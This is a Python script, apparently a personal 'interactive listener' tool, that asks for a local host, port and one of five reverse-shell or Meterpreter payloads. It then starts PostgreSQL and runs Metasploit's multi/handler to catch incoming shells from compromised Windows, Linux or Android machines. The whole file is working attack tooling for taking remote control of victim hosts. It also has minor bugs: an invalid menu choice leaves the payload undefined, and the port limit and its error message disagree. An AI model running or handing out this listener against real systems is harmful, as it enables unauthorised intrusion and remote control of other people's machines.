#!/usr/bin/python3
import subprocess
import ipaddress

print ("\nWelcome To Vikas's Interactive Listener Tool\n")

#Function That Takes IP Input And Validate
def takevalip():
	takevalip.LHOST = input("SET LHOST : ")  #Takes Input
	try:
		ipaddress.ip_address(takevalip.LHOST)  #Validates
	except ValueError:
		print ("IP Look Invalid, Try Another") #Throws Error If Not Valid
		takevalip()
#Function That Takes Port Input And Validate
def takevalport():
	takevalport.LPORT = int(input("SET LPORT : ")) #Take PORT
	if (takevalport.LPORT > 65530):		#Validates and Redirects If Wrong Input Given
		print ("The Port Is Not Allowed Please Give Below 65000")
		takevalport()

takevalip()  	#Runs The Function
takevalport()	#Runs The Function
LHOST = takevalip.LHOST
LPORT = takevalport.LPORT

#Prompts User For Payload Selection Input
print ("\nWhich Payload You Want To Use\n\n"
        "1)Windows MeterPreter\n"
	"2)Windows Shell\n"
	"3)Linux Meterpreter\n"
	"4)Linux Shell\n"
	"5)Android Meterpreter\n\n")
PAYLOAD = input("Give A Number : ")

# Payload Will Be Selected Based On User Input
if (PAYLOAD == "1"):
	p = ("windows/meterpreter/reverse_tcp")
elif (PAYLOAD == "2"):
	p = ("windows/shell_reverse_tcp")
elif (PAYLOAD == "3"):
	p = ("linux/x86/meterpreter/reverse_tcp")
elif (PAYLOAD == "4"):
	p = ("linux/x86/shell_reverse_tcp")
elif (PAYLOAD == "5"):
	p = ("android/meterpreter/reverse_tcp")
else:
	print ("Wrong Option Taken, Try Again")

print ("\nStarting The Listener...\n")
print ("Please Wait It Might Take A While...\n")

#Creates A Ninja Command For The All Options Taken By User
command = "use exploit/multi/handler;set PAYLOAD "+p+";set LHOST "+str(LHOST)+";set LPORT "+str(LPORT)+";exploit -j"

#Postgresql Will Be Started
subprocess.call(["service","postgresql","start"])

#Ninja Command Will Be Executed
subprocess.call(["msfconsole", "-q" ,"-x", command])


###THE END
